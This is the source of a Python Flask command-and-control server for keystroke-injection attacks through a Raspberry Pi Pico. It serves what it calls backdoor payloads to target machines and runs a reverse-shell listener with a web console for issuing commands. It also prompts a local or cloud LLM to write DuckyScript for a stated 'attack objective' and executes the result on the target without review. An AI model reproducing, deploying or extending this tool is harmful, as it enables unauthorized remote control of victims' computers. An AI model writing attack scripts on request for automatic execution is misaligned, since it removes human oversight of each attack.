#!/usr/bin/env python3
"""
Advanced Ducky Script C2 Server with AI-powered HID injection
"""
import os
import json
import threading
import socket
import argparse
from pathlib import Path
from flask import Flask, request, render_template_string, jsonify, send_from_directory
import requests

# Global configuration
PICO_URL = "http://192.168.4.1/api/executeCommand/"
PAYLOAD_DIR = Path(__file__).parent / "payloads"
TEMPLATE_DIR = Path(__file__).parent / "templates"
REVERSE_SHELL_PORT = 4444

# LLM configuration
llm_enabled = False
llm_provider = None  # 'ollama' or 'openrouter'
llm_model_name = None
llm_ollama_url = "http://localhost:11434"
llm_openrouter_api_key = None
reverse_shell_sessions = {}

app = Flask(__name__)

# Ensure directories exist
PAYLOAD_DIR.mkdir(exist_ok=True)
TEMPLATE_DIR.mkdir(exist_ok=True)

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Advanced Ducky Script C2 Server</title>
    <script src="https://cdn.tailwindcss.com"></script>
</head>
<body class="bg-gray-900 text-gray-100 min-h-screen">
    <div class="container mx-auto p-4">
        <h1 class="text-4xl font-bold text-center mb-8 text-green-400">🦆 Ducky Script C2 Server</h1>
        
        <!-- Tabs -->
        <div class="mb-4 border-b border-gray-700">
            <nav class="-mb-px flex space-x-8">
                <button onclick="switchTab('manual')" id="tab-manual" class="tab-button border-b-2 border-green-500 py-2 px-4 font-medium">Manual</button>
                <button onclick="switchTab('templates')" id="tab-templates" class="tab-button border-b-2 border-transparent py-2 px-4 font-medium hover:border-gray-300">Templates</button>
                <button onclick="switchTab('llm')" id="tab-llm" class="tab-button border-b-2 border-transparent py-2 px-4 font-medium hover:border-gray-300">AI Assistant</button>
                <button onclick="switchTab('payloads')" id="tab-payloads" class="tab-button border-b-2 border-transparent py-2 px-4 font-medium hover:border-gray-300">Payloads</button>
                <button onclick="switchTab('shells')" id="tab-shells" class="tab-button border-b-2 border-transparent py-2 px-4 font-medium hover:border-gray-300">Reverse Shells</button>
            </nav>
        </div>

        <!-- Manual Tab -->
        <div id="content-manual" class="tab-content">
            <div class="bg-gray-800 p-6 rounded-lg shadow-lg">
                <h2 class="text-2xl font-bold mb-4">Manual Script Execution</h2>
                <form id="scriptForm" class="space-y-4">
                    <div>
                        <label for="script" class="block text-sm font-medium mb-2">Ducky Script:</label>
                        <textarea name="script" id="script" rows="12" class="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500" placeholder="STRING Hello World&#10;ENTER"></textarea>
                    </div>
                    <div>
                        <label for="file" class="block text-sm font-medium mb-2">Or load from file:</label>
                        <input type="file" id="file" accept=".txt,.dd" class="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-md focus:outline-none focus:ring-2 focus:ring-green-500">
                    </div>
                    <button id="submitBtn" type="submit" class="w-full bg-green-600 text-white py-2 px-4 rounded-md hover:bg-green-700 focus:outline-none focus:ring-2 focus:ring-green-500">Execute Script</button>
                </form>
                <div id="status" class="mt-4 p-4 rounded-md hidden"></div>
            </div>
        </div>

        <!-- Templates Tab -->
        <div id="content-templates" class="tab-content hidden">
            <div class="bg-gray-800 p-6 rounded-lg shadow-lg">
                <h2 class="text-2xl font-bold mb-4">Script Templates</h2>
                <div id="templates-list" class="space-y-2">
                    <p class="text-gray-400">Loading templates...</p>
                </div>
            </div>
        </div>

        <!-- LLM Tab -->
        <div id="content-llm" class="tab-content hidden">
            <div class="bg-gray-800 p-6 rounded-lg shadow-lg">
                <h2 class="text-2xl font-bold mb-4">AI-Powered HID Injection</h2>
                <div class="mb-4">
                    <label class="flex items-center space-x-2">
                        <input type="checkbox" id="llm-enable" onchange="toggleLLM()" class="form-checkbox h-5 w-5 text-green-600">
                        <span>Enable AI Assistant</span>
                    </label>
                </div>
                <div id="llm-config" class="space-y-4 hidden">
                    <div>
                        <label for="llm-provider" class="block text-sm font-medium mb-2">Provider:</label>
                        <select id="llm-provider" onchange="toggleProviderFields()" class="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-md">
                            <option value="ollama">Ollama (Local)</option>
                            <option value="openrouter">OpenRouter (Cloud)</option>
                        </select>
                    </div>
                    <div id="ollama-fields">
                        <div class="mb-3">
                            <label for="llm-model" class="block text-sm font-medium mb-2">Model:</label>
                            <input type="text" id="llm-model" value="phi4:mini" placeholder="e.g., phi4:mini, llama2, mistral" class="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-md">
                        </div>
                        <div>
                            <label for="llm-url" class="block text-sm font-medium mb-2">Ollama URL:</label>
                            <input type="text" id="llm-url" value="http://localhost:11434" class="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-md">
                        </div>
                    </div>
                    <div id="openrouter-fields" class="hidden">
                        <div class="mb-3">
                            <label for="llm-model-or" class="block text-sm font-medium mb-2">Model:</label>
                            <input type="text" id="llm-model-or" value="devstral-small-2505:free" class="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-md" placeholder="devstral-small-2505:free">
                            <p class="text-xs text-gray-400 mt-1">Free model: devstral-small-2505:free (recommended for Ducky scripts)</p>
                        </div>
                        <div>
                            <label for="llm-apikey" class="block text-sm font-medium mb-2">API Key:</label>
                            <input type="password" id="llm-apikey" class="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-md" placeholder="sk-or-v1-...">
                            <p class="text-xs text-gray-400 mt-1">Get free API key at <a href="https://openrouter.ai/keys" target="_blank" class="text-blue-400 hover:underline">openrouter.ai/keys</a></p>
                        </div>
                    </div>
                    <button onclick="initLLM()" class="bg-green-600 text-white py-2 px-4 rounded-md hover:bg-green-700">Initialize Model</button>
                    <div id="llm-status" class="text-sm text-gray-400"></div>
                </div>
                <div id="llm-interface" class="space-y-4 hidden">
                    <div>
                        <label for="llm-objective" class="block text-sm font-medium mb-2">Attack Objective:</label>
                        <textarea id="llm-objective" rows="3" class="w-full px-3 py-2 bg-gray-700 border border-gray-600 rounded-md" placeholder="e.g., Open calculator and type 'hello'"></textarea>
                    </div>
                    <button onclick="executeLLMAttack()" class="bg-red-600 text-white py-2 px-4 rounded-md hover:bg-red-700">Generate & Execute Attack</button>
                    <div id="llm-output" class="mt-4 p-4 bg-gray-900 rounded-md overflow-auto max-h-96"></div>
                </div>
            </div>
        </div>

        <!-- Payloads Tab -->
        <div id="content-payloads" class="tab-content hidden">
            <div class="bg-gray-800 p-6 rounded-lg shadow-lg">
                <h2 class="text-2xl font-bold mb-4">Payload Server</h2>
                <p class="text-gray-400 mb-4">Serve backdoor payloads to target machines</p>
                <div id="payloads-list" class="space-y-2">
                    <p class="text-gray-400">Loading payloads...</p>
                </div>
            </div>
        </div>

        <!-- Reverse Shells Tab -->
        <div id="content-shells" class="tab-content hidden">
            <div class="bg-gray-800 p-6 rounded-lg shadow-lg">
                <h2 class="text-2xl font-bold mb-4">Active Reverse Shells</h2>
                <div class="mb-4">
                    <p class="text-sm text-gray-400">Listening on port: {{ shell_port }}</p>
                </div>
                <div id="shells-list">
                    <p class="text-gray-400">No active sessions</p>
                </div>
                <div class="mt-4">
                    <h3 class="text-xl font-bold mb-2">Shell Command</h3>
                    <div class="flex space-x-2">
                        <input type="text" id="shell-cmd" placeholder="Enter command..." class="flex-1 px-3 py-2 bg-gray-700 border border-gray-600 rounded-md">
                        <button onclick="sendShellCommand()" class="bg-green-600 text-white py-2 px-4 rounded-md hover:bg-green-700">Send</button>
                    </div>
                    <div id="shell-output" class="mt-4 p-4 bg-gray-900 rounded-md overflow-auto max-h-96 font-mono text-sm"></div>
                </div>
            </div>
        </div>
    </div>

    <script>
        function switchTab(tabName) {
            // Hide all tabs
            document.querySelectorAll('.tab-content').forEach(el => el.classList.add('hidden'));
            document.querySelectorAll('.tab-button').forEach(el => {
                el.classList.remove('border-green-500');
                el.classList.add('border-transparent');
            });
            
            // Show selected tab
            document.getElementById('content-' + tabName).classList.remove('hidden');
            document.getElementById('tab-' + tabName).classList.remove('border-transparent');
            document.getElementById('tab-' + tabName).classList.add('border-green-500');
            
            // Load dynamic content
            if (tabName === 'templates') loadTemplates();
            if (tabName === 'payloads') loadPayloads();
            if (tabName === 'shells') loadShells();
        }

        // Manual script execution
        document.getElementById('scriptForm').addEventListener('submit', function(e) {
            e.preventDefault();
            const fileInput = document.getElementById('file');
            const textarea = document.getElementById('script');

            function postScript(content) {
                const submitBtn = document.getElementById('submitBtn');
                const statusDiv = document.getElementById('status');
                if (submitBtn) submitBtn.disabled = true;
                
                fetch('/execute', {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({ script: content })
                })
                .then(resp => resp.json())
                .then(data => {
                    statusDiv.classList.remove('hidden');
                    if (data.success) {
                        statusDiv.className = 'mt-4 p-4 rounded-md bg-green-900 text-green-200';
                        statusDiv.textContent = 'Script executed successfully!';
                    } else {
                        statusDiv.className = 'mt-4 p-4 rounded-md bg-red-900 text-red-200';
                        statusDiv.textContent = 'Error: ' + data.error;
                    }
                })
                .catch(err => {
                    statusDiv.classList.remove('hidden');
                    statusDiv.className = 'mt-4 p-4 rounded-md bg-red-900 text-red-200';
                    statusDiv.textContent = 'Error: ' + err;
                })
                .finally(() => {
                    if (submitBtn) submitBtn.disabled = false;
                });
            }

            if (fileInput && fileInput.files && fileInput.files.length > 0) {
                const file = fileInput.files[0];
                const reader = new FileReader();
                reader.onload = evt => postScript(evt.target.result);
                reader.readAsText(file);
            } else {
                postScript(textarea.value);
            }
        });

        // Templates
        function loadTemplates() {
            fetch('/api/templates')
                .then(resp => resp.json())
                .then(data => {
                    const list = document.getElementById('templates-list');
                    if (data.templates.length === 0) {
                        list.innerHTML = '<p class="text-gray-400">No templates available</p>';
                    } else {
                        list.innerHTML = data.templates.map(t => 
                            `<div class="flex items-center justify-between p-3 bg-gray-700 rounded-md">
                                <span>${t}</span>
                                <div class="space-x-2">
                                    <button onclick="viewTemplate('${t}')" class="bg-blue-600 px-3 py-1 rounded hover:bg-blue-700">View</button>
                                    <button onclick="executeTemplate('${t}')" class="bg-green-600 px-3 py-1 rounded hover:bg-green-700">Execute</button>
                                </div>
                            </div>`
                        ).join('');
                    }
                });
        }

        function viewTemplate(name) {
            fetch('/api/template/' + encodeURIComponent(name))
                .then(resp => resp.json())
                .then(data => {
                    document.getElementById('script').value = data.content;
                    switchTab('manual');
                });
        }

        function executeTemplate(name) {
            if (confirm('Execute template: ' + name + '?')) {
                fetch('/api/template/' + encodeURIComponent(name))
                    .then(resp => resp.json())
                    .then(data => {
                        return fetch('/execute', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ script: data.content })
                        });
                    })
                    .then(resp => resp.json())
                    .then(data => {
                        alert(data.success ? 'Template executed!' : 'Error: ' + data.error);
                    });
            }
        }

        // Payloads
        function loadPayloads() {
            fetch('/api/payloads')
                .then(resp => resp.json())
                .then(data => {
                    const list = document.getElementById('payloads-list');
                    if (data.payloads.length === 0) {
                        list.innerHTML = '<p class="text-gray-400">No payloads available</p>';
                    } else {
                        list.innerHTML = data.payloads.map(p => 
                            `<div class="flex items-center justify-between p-3 bg-gray-700 rounded-md">
                                <span>${p}</span>
                                <a href="/payloads/${p}" target="_blank" class="bg-blue-600 px-3 py-1 rounded hover:bg-blue-700">Download</a>
                            </div>`
                        ).join('');
                    }
                });
        }

        // LLM
        function toggleLLM() {
            const enabled = document.getElementById('llm-enable').checked;
            document.getElementById('llm-config').classList.toggle('hidden', !enabled);
        }

        function toggleProviderFields() {
            const provider = document.getElementById('llm-provider').value;
            const ollamaFields = document.getElementById('ollama-fields');
            const openrouterFields = document.getElementById('openrouter-fields');
            
            if (provider === 'ollama') {
                ollamaFields.classList.remove('hidden');
                openrouterFields.classList.add('hidden');
            } else {
                ollamaFields.classList.add('hidden');
                openrouterFields.classList.remove('hidden');
            }
        }

        function initLLM() {
            const provider = document.getElementById('llm-provider').value;
            const status = document.getElementById('llm-status');
            const initBtn = event.target;
            
            let payload = { provider: provider };
            
            // Disable button and show loading
            initBtn.disabled = true;
            
            if (provider === 'ollama') {
                const model = document.getElementById('llm-model').value;
                const url = document.getElementById('llm-url').value;
                payload.model = model;
                payload.url = url;
                status.textContent = 'Connecting to Ollama and loading model... (this may take up to 60 seconds)';
                status.className = 'text-sm text-yellow-400';
            } else {
                const model = document.getElementById('llm-model-or').value;
                const apiKey = document.getElementById('llm-apikey').value;
                payload.model = model;
                payload.api_key = apiKey;
                status.textContent = 'Connecting to OpenRouter... (this may take up to 30 seconds)';
                status.className = 'text-sm text-yellow-400';
            }
            
            fetch('/api/llm/init', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload)
            })
            .then(resp => resp.json())
            .then(data => {
                if (data.success) {
                    status.textContent = 'Model ready: ' + payload.model + ' (' + provider + ')';
                    status.className = 'text-sm text-green-400';
                    document.getElementById('llm-interface').classList.remove('hidden');
                } else {
                    status.textContent = 'Error: ' + data.error;
                    status.className = 'text-sm text-red-400';
                }
            })
            .catch(err => {
                status.textContent = 'Error: ' + err.message + ' (Connection timeout or network error)';
                status.className = 'text-sm text-red-400';
            })
            .finally(() => {
                initBtn.disabled = false;
            });
        }

        function executeLLMAttack() {
            const objective = document.getElementById('llm-objective').value;
            const output = document.getElementById('llm-output');
            output.textContent = 'Generating attack...';
            
            fetch('/api/llm/attack', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ objective: objective })
            })
            .then(resp => resp.json())
            .then(data => {
                output.innerHTML = '<pre>' + JSON.stringify(data, null, 2) + '</pre>';
            });
        }

        // Reverse shells
        function loadShells() {
            fetch('/api/shells')
                .then(resp => resp.json())
                .then(data => {
                    const list = document.getElementById('shells-list');
                    if (data.sessions.length === 0) {
                        list.innerHTML = '<p class="text-gray-400">No active sessions</p>';
                    } else {
                        list.innerHTML = data.sessions.map(s => 
                            `<div class="p-3 bg-gray-700 rounded-md">
                                <strong>${s.id}</strong> - ${s.address} (connected: ${s.connected_at})
                            </div>`
                        ).join('');
                    }
                });
        }

        function sendShellCommand() {
            const cmd = document.getElementById('shell-cmd').value;
            const output = document.getElementById('shell-output');
            
            fetch('/api/shell/command', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ command: cmd })
            })
            .then(resp => resp.json())
            .then(data => {
                output.textContent += '$ ' + cmd + '\\n' + data.output + '\\n';
                output.scrollTop = output.scrollHeight;
            });
        }

        // Initial load
        loadTemplates();
    </script>
</body>
</html>
"""


@app.route('/')
def index():
    return render_template_string(HTML_TEMPLATE, shell_port=REVERSE_SHELL_PORT)


@app.route('/execute', methods=['POST'])
def execute_script():
    """Execute ducky script on target"""
    data = request.get_json()
    script = data.get('script', '')
    
    if not script.strip():
        return jsonify({'success': False, 'error': 'No script provided'})
    
    try:
        # Explicitly set form-encoded content-type to ensure Pico parses it as form data
        response = requests.post(
            PICO_URL,
            data={'cmd': script},
            timeout=5,
            headers={'Content-Type': 'application/x-www-form-urlencoded'}
        )
        if response.status_code == 200:
            return jsonify({'success': True})
        else:
            return jsonify({'success': False, 'error': f'HTTP {response.status_code}'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/templates')
def list_templates():
    """List available script templates"""
    templates = [f.name for f in TEMPLATE_DIR.glob('*.dd')]
    return jsonify({'templates': templates})


@app.route('/api/template/<name>')
def get_template(name):
    """Get template content"""
    template_path = TEMPLATE_DIR / name
    if not template_path.exists():
        return jsonify({'error': 'Template not found'}), 404
    
    with open(template_path, 'r') as f:
        content = f.read()
    
    return jsonify({'name': name, 'content': content})


@app.route('/payloads/<path:filename>')
def serve_payload(filename):
    """Serve payload files"""
    return send_from_directory(PAYLOAD_DIR, filename)


@app.route('/api/payloads')
def list_payloads():
    """List available payloads"""
    payloads = [f.name for f in PAYLOAD_DIR.iterdir() if f.is_file()]
    return jsonify({'payloads': payloads})


@app.route('/api/llm/init', methods=['POST'])
def init_llm():
    """Initialize LLM model with Ollama or OpenRouter"""
    global llm_enabled, llm_provider, llm_model_name, llm_ollama_url, llm_openrouter_api_key
    
    data = request.get_json()
    provider = data.get('provider', 'ollama')
    model_name = data.get('model', 'phi4:mini')
    
    try:
        if provider == 'ollama':
            ollama_url = data.get('url', 'http://localhost:11434')
            
            # Test connection to Ollama (longer timeout for model loading)
            test_response = requests.post(
                f"{ollama_url}/api/generate",
                json={"model": model_name, "prompt": "test", "stream": False},
                timeout=60  # Increased to 60 seconds for model loading
            )
            
            if test_response.status_code == 200:
                llm_enabled = True
                llm_provider = 'ollama'
                llm_model_name = model_name
                llm_ollama_url = ollama_url
                return jsonify({'success': True, 'model': model_name, 'provider': 'ollama'})
            else:
                return jsonify({'success': False, 'error': f'Ollama returned status {test_response.status_code}'})
                
        elif provider == 'openrouter':
            api_key = data.get('api_key', '')
            
            if not api_key:
                return jsonify({'success': False, 'error': 'API key is required for OpenRouter'})
            
            # Test connection to OpenRouter (longer timeout for cold start)
            test_response = requests.post(
                "https://openrouter.ai/api/v1/chat/completions",
                headers={
                    "Authorization": f"Bearer {api_key}",
                    "Content-Type": "application/json"
                },
                json={
                    "model": model_name,
                    "messages": [{"role": "user", "content": "test"}],
                    "max_tokens": 10
                },
                timeout=30  # Increased to 30 seconds for cold start
            )
            
            if test_response.status_code == 200:
                llm_enabled = True
                llm_provider = 'openrouter'
                llm_model_name = model_name
                llm_openrouter_api_key = api_key
                return jsonify({'success': True, 'model': model_name, 'provider': 'openrouter'})
            else:
                error_msg = test_response.json().get('error', {}).get('message', f'Status {test_response.status_code}')
                return jsonify({'success': False, 'error': f'OpenRouter error: {error_msg}'})
        else:
            return jsonify({'success': False, 'error': f'Unknown provider: {provider}'})
            
    except requests.exceptions.ConnectionError:
        if provider == 'ollama':
            return jsonify({'success': False, 'error': 'Cannot connect to Ollama. Make sure Ollama is running.'})
        else:
            return jsonify({'success': False, 'error': 'Cannot connect to OpenRouter. Check your internet connection.'})
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/llm/attack', methods=['POST'])
def llm_attack():
    """Generate and execute AI-powered attack using Ollama or OpenRouter"""
    global llm_provider, llm_model_name, llm_ollama_url, llm_openrouter_api_key
    
    if not llm_enabled:
        return jsonify({'success': False, 'error': 'LLM not initialized'})
    
    data = request.get_json()
    objective = data.get('objective', '')
    
    try:
        # Generate ducky script using LLM
        prompt = f"""You are an expert Rubber Ducky script generator for CircuitPython Implementation of DuckyScript on Raspberry Pi Pico W.

OBJECTIVE: {objective}

GENERATE ONLY valid Rubber Ducky script commands that will execute successfully on CircuitPython + adafruit_hid.

=== AVAILABLE COMMANDS ===

**KEYBOARD KEYS:**
- Letters: A-Z (uppercase only, no lowercase)
- Numbers: 0-9
- Function keys: F1-F24
- Special keys: ESC, TAB, ENTER, SPACE, BACKSPACE, DELETE, INSERT, HOME, END, PAGEUP, PAGEDOWN
- System keys: PRINTSCREEN, SCROLLLOCK, PAUSE, CAPSLOCK, NUMLOCK
- Navigation: UP, DOWN, LEFT, RIGHT (or UPARROW, DOWNARROW, LEFTARROW, RIGHTARROW)

**MODIFIERS (Generally used with other keys):**
- GUI (Windows key / Command key)
- CTRL (Control key)
- ALT (Alt key)
- SHIFT (Shift key)

**MEDIA KEYS:**
- MK_VOLUP (Volume Up)
- MK_VOLDOWN (Volume Down)
- MK_MUTE (Mute)
- MK_NEXT (Next Track)
- MK_PREV (Previous Track)
- MK_PP (Play/Pause)
- MK_STOP (Stop)

**COMMANDS:**
- DELAY <milliseconds> - Wait specified time (recommended: 100-1000ms)
- STRING <text> - Type the text exactly as written
- STRINGLN <text> - Type text followed by ENTER
- HOLD <key> - Press and hold a key
- RELEASE <key> - Release a held key
- REM <comment> - Comment (ignored by parser)

**ADVANCED COMMANDS:**
- VAR $<name> = <value> - Define variable
- DEFINE <name> <value> - Define constant
- WHILE <condition> ... END_WHILE - Loop while condition is true
- IF <condition> ... END_IF - Conditional execution
- FUNCTION <name> ... END_FUNCTION - Define function
- IMPORT <filename> - Import another script file
- PRINT <text> - Print to console (for debugging)

=== IMPORTANT RULES ===

1. **OUTPUT FORMAT**: Only valid commands, one per line, no explanations or markdown
2. **KEY COMBINATIONS**: For multiple keys, list them sequentially (e.g., CTRL ALT DELETE)
3. **TIMING**: Always use DELAY between commands (minimum 100ms, recommended 200-500ms)
4. **TEXT INPUT**: Use STRING for typing, ENTER for pressing Enter key
5. **WINDOWS SHORTCUTS**:
   - Run dialog(Windows only and thus not recommended. Use Start Menu's integrated execution feature.): GUI r
   - Start menu: GUI (Common, almost all OS), or CTRL ESC (Windows), or GUI SPACE (Mac)
   - Task Manager: CTRL SHIFT ESC
   - PowerShell: GUI, then type "powershell", ENTER
   - Security Options: CTRL ALT DELETE
   - Lock screen: GUI l
   - File Explorer: GUI e
   - Run Program: GUI, then type program name, ENTER
6. **DUCKYSCRIPT LIMITATIONS**:
   - No lowercase letters (use SHIFT for uppercase)
   - Commands execute sequentially with delays
   - HID keyboard simulation only
7. **ERROR PREVENTION**:
   - Don't use unsupported keys
   - Don't use lowercase letters unless want to type text with STRING
   - Always include delays between commands
   - Test key combinations work on target OS

=== EXAMPLES ===

**Shut down(Windows)**
```
GUI
DELAY 100
STRING powershell
DELAY 100
ENTER
DELAY 1500
STRING shutdown /s /t 000
DELAY 100
ENTER
```

**Shut down(Linux)**
```
GUI
DELAY 100
STRING terminal
DELAY 100
ENTER
DELAY 1500
STRING sudo halt -p
DELAY 100
ENTER
```

**Open Calculator:**
```
GUI
DELAY 100
STRING calc
DELAY 100
ENTER
```

**Open Notepad and type text:**
```
GUI
DELAY 100
STRING notepad
DELAY 100
ENTER
DELAY 1500
STRING Hello World from Ducky!
ENTER
```

**Open Command Prompt as Admin:**
```
GUI
DELAY 500
STRING cmd
CTRL SHIFT ENTER
DELAY 1000
ALT y
```

**Volume Control:**
```
MK_VOLUP
DELAY 200
MK_VOLUP
DELAY 200
MK_MUTE
```

**Open Task Manager:**
```
CTRL SHIFT ESC

```
**Lock the Screen:**
```
GUI l
```
Now, based on the objective above, Generate the script now:"""
        
        generated_text = ""
        
        if llm_provider == 'ollama':
            # Call Ollama API
            response = requests.post(
                f"{llm_ollama_url}/api/generate",
                json={
                    "model": llm_model_name,
                    "prompt": prompt,
                    "stream": False,
                    "options": {
                        "temperature": 0.7,
                        "top_p": 0.9
                    }
                },
                timeout=150  # Increased to 150 seconds (2.5 minutes) for generation
            )
            
            if response.status_code != 200:
                return jsonify({'success': False, 'error': f'Ollama API error: {response.status_code}'})
            
            result = response.json()
            generated_text = result.get('response', '')
            
        elif llm_provider == 'openrouter':
            # Call OpenRouter API
            response = requests.post(
                "https://openrouter.ai/api/v1/chat/completions",
                headers={
                    "Authorization": f"Bearer {llm_openrouter_api_key}",
                    "Content-Type": "application/json"
                },
                json={
                    "model": llm_model_name,
                    "messages": [
                        {"role": "system", "content": "You are a Rubber Ducky script generator. Output only valid Rubber Ducky commands, one per line."},
                        {"role": "user", "content": prompt}
                    ],
                    "temperature": 0.7,
                    "max_tokens": 500
                },
                timeout=150  # Increased to 150 seconds (2.5 minutes) for generation
            )
            
            if response.status_code != 200:
                error_msg = response.json().get('error', {}).get('message', f'Status {response.status_code}')
                return jsonify({'success': False, 'error': f'OpenRouter API error: {error_msg}'})
            
            result = response.json()
            generated_text = result['choices'][0]['message']['content']
        
        # Extract script (parse only valid ducky commands)
        # Valid key names from ducky.py
        valid_keys = [
            'WINDOWS', 'RWINDOWS', 'GUI', 'RGUI', 'COMMAND', 'RCOMMAND', 'APP', 'MENU', 'SHIFT', 'RSHIFT',
            'ALT', 'RALT', 'OPTION', 'ROPTION', 'CONTROL', 'CTRL', 'RCTRL', 'DOWNARROW', 'DOWN', 'LEFTARROW',
            'LEFT', 'RIGHTARROW', 'RIGHT', 'UPARROW', 'UP', 'BREAK', 'PAUSE', 'CAPSLOCK', 'DELETE',
            'END', 'ESC', 'ESCAPE', 'HOME', 'INSERT', 'NUMLOCK', 'PAGEUP', 'PAGEDOWN', 'PRINTSCREEN', 'ENTER',
            'SCROLLLOCK', 'SPACE', 'TAB', 'BACKSPACE', 'A', 'B', 'C', 'D', 'E', 'F', 'G', 'H', 'I', 'J',
            'K', 'L', 'M', 'N', 'O', 'P', 'Q', 'R', 'S', 'T', 'U', 'V', 'W', 'X', 'Y', 'Z',
            'F1', 'F2', 'F3', 'F4', 'F5', 'F6', 'F7', 'F8', 'F9', 'F10', 'F11', 'F12', 'F13', 'F14', 'F15',
            'F16', 'F17', 'F18', 'F19', 'F20', 'F21', 'F22', 'F23', 'F24',
            'MK_VOLUP', 'MK_VOLDOWN', 'MK_MUTE', 'MK_NEXT', 'MK_PREV', 'MK_PP', 'MK_STOP'
        ]
        
        script_lines = []
        for line in generated_text.split('\n'):
            line = line.strip()
            # Skip empty lines and markdown
            if not line or line.startswith('```') or line.startswith('#') or line.startswith('*'):
                continue
            # Include valid Ducky commands
            upper_line = line.upper()
            if (any(upper_line.startswith(cmd) for cmd in [
                'REM', 'HOLD', 'RELEASE', 'DELAY', 'STRING', 'STRINGLN', 'PRINT', 'IMPORT',
                'DEFAULT_DELAY', 'DEFAULTDELAY', 'VAR', 'DEFINE', 'FUNCTION', 'END_FUNCTION',
                'WHILE', 'END_WHILE', 'IF', 'END_IF', 'ELSE', 'RANDOM_'
            ]) or 
            line.startswith('$') or  # Variable assignment
            line.upper() in valid_keys or  # Single key press
            (len(line.split()) >= 1 and line.split()[0].upper() in valid_keys)):  # Key combinations
                script_lines.append(line)
        
        script = '\n'.join(script_lines)
        
        # Execute if we have a script
        success = False
        if script:
            try:
                exec_response = requests.post(PICO_URL, data={'cmd': script}, timeout=5,
                                               headers={'Content-Type': 'application/x-www-form-urlencoded'})
                success = exec_response.status_code == 200
            except:
                pass
            
        return jsonify({
            'success': success,
            'objective': objective,
            'generated_script': script,
            'full_output': generated_text,
            'model': llm_model_name,
            'provider': llm_provider
        })
    except Exception as e:
        return jsonify({'success': False, 'error': str(e)})


@app.route('/api/shells')
def list_shells():
    """List active reverse shell sessions"""
    sessions = [
        {'id': sid, 'address': sess['address'], 'connected_at': sess['connected_at']}
        for sid, sess in reverse_shell_sessions.items()
    ]
    return jsonify({'sessions': sessions})


@app.route('/api/shell/command', methods=['POST'])
def shell_command():
    """Execute command on reverse shell"""
    data = request.get_json()
    cmd = data.get('command', '')
    
    # Get first active session
    if not reverse_shell_sessions:
        return jsonify({'output': 'No active sessions'})
    
    session_id = list(reverse_shell_sessions.keys())[0]
    session = reverse_shell_sessions[session_id]
    
    try:
        sock = session['socket']
        sock.send((cmd + '\n').encode())
        output = sock.recv(4096).decode('utf-8', errors='ignore')
        return jsonify({'output': output})
    except Exception as e:
        return jsonify({'output': f'Error: {str(e)}'})


def reverse_shell_listener():
    """Listen for reverse shell connections"""
    global reverse_shell_sessions
    
    server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    server.bind(('0.0.0.0', REVERSE_SHELL_PORT))
    server.listen(5)
    print(f"[*] Reverse shell listener started on port {REVERSE_SHELL_PORT}")
    
    while True:
        try:
            client, address = server.accept()
            session_id = f"session_{len(reverse_shell_sessions) + 1}"
            reverse_shell_sessions[session_id] = {
                'socket': client,
                'address': f"{address[0]}:{address[1]}",
                'connected_at': str(threading.current_thread())
            }
            print(f"[+] New reverse shell connection: {session_id} from {address}")
        except Exception as e:
            print(f"[!] Error in reverse shell listener: {e}")


def main():
    parser = argparse.ArgumentParser(description="Advanced Ducky Script C2 Server")
    parser.add_argument('--host', default='0.0.0.0', help='Host to bind to')
    parser.add_argument('--port', type=int, default=5000, help='Port to bind to')
    parser.add_argument('--shell-port', type=int, default=4444, help='Reverse shell port')
    
    args = parser.parse_args()
    
    global REVERSE_SHELL_PORT
    REVERSE_SHELL_PORT = args.shell_port
    
    # Start reverse shell listener in background
    shell_thread = threading.Thread(target=reverse_shell_listener, daemon=True)
    shell_thread.start()
    
    print(f"[*] Starting C2 Server on {args.host}:{args.port}")
    print(f"[*] Reverse shell listener on port {REVERSE_SHELL_PORT}")
    print(f"[*] Payload directory: {PAYLOAD_DIR}")
    print(f"[*] Template directory: {TEMPLATE_DIR}")
    
    app.run(host=args.host, port=args.port, debug=False)


if __name__ == '__main__':
    main()
